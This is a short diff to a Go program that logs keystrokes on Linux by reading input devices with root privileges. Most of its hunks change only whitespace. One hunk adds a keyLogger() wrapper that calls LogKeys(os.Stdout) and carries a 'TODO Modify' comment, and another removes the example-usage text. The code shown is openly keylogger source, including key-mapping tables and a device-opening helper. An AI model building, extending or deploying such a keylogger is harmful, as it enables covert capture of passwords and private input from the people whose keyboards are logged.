@@ -21,6 +21,7 @@ type inputEvent struct {
 	code      uint16
 	value     int32
 }
+
 var (
 	charKeys  = "1234567890-=qwertyuiop[]asdfghjkl;'`\\zxcvbnm,./<"
 	shiftKeys = `!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:"~|ZXCVBNM<>?>`
@@ -35,6 +36,7 @@ var (
 
 	charOrFunc = "_fccccccccccccffccccccccccccffccccccccccccfcccccccccccffffffffffffffffffffffffffffff__cff_______ffffffffffffffff_______f_____fff"
 )
+
 const (
 	Key1          = 2
 	KeyEqual      = 13
@@ -93,7 +95,6 @@ func dumpDevices() []string {
 
 	return devices
 }
-
 
 func isCharKey(ch uint) bool {
 	if ch >= uint(len(charOrFunc)) {
@@ -162,7 +163,6 @@ func toFuncKeysIndex(keycode int) int {
 	return -1
 }
 
-
 // helper function to open the input device
 func openInputFD(path string) (*os.File, error) {
 	input, err := os.OpenFile(path, os.O_RDONLY, 0600)
@@ -215,14 +215,13 @@ const (
 	EvRepeat = 2
 )
 
-
-
-
-
+func keyLogger() {
+	LogKeys(os.Stdout) // TODO Modify
+}
 
 // LogKeys is the all-encapsulated function for logging keystrokes in Linux
 // with root privileges.
-// 			Example usage: LogKeys(os.Stdout).
+// 			Example usage: .
 func LogKeys(out *os.File) {
 	// our communication channels for the input event goroutine
 	events := make(chan inputEvent, 1)
